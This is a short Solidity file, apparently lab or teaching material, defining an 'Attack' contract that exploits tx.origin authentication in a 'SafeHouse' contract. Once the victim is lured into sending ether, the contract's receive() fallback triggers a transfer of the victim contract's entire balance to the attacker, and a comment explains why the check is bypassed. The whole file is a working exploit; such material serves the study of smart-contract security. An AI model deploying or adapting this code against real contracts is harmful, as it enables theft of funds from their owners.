// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SafeHouse.sol";
//
//the attacker should triger the victim to make the call (transfer some ether)
contract Attack {

    address payable public owner;
    SafeHouse safeHouse;

    constructor(SafeHouse _safeHouse) 
    {
        safeHouse = SafeHouse(_safeHouse);
        owner = payable(msg.sender); //and it will be tx.origin in SafeHouse
    }

    function attack() public{
        safeHouse.transfer(owner, address(safeHouse).balance);
    }

    receive() payable external {
        attack();
    }


}